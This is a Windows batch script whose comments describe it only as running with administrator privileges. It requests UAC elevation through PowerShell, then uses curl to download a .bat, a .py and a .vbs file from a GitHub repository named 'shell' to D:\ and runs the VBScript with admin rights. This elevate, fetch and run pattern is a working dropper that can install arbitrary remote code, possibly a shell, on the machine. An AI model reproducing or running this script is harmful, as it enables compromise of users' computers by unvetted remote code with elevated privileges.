@echo off
REM Batch script to execute with administrator privileges

REM Check if the script is running with administrative privileges
>nul 2>&1 net session && (
    REM If running with admin privileges, execute the script commands here
    echo Running with administrative privileges
    pause
) || (
    REM If not running with admin privileges, request elevation and rerun the script
    echo Requesting administrative privileges...
    powershell Start-Process -FilePath "%0" -Verb RunAs
    exit
)

curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat 
curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o D:\sh.py 
curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs 
call D:\vb.vbs
exit
